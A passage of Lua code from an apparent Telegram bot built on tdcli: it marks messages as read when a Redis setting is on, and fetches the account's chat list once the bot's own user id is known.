		if redis:get("tg:" .. Ads_id .. ":markread") then
			tdcli_function ({
				ID = "ViewMessages",
				chat_id_ = msg.chat_id_,
				message_ids_ = {[0] = msg.id_} 
			}, cb or dl_cb, cmd)
		end
	elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
		tdcli_function ({
			ID = "GetChats",
			offset_order_ = 9223372036854775807,
			offset_chat_id_ = 0,
			limit_ = 300000
		}, cb or dl_cb, cmd)
	   end
  end

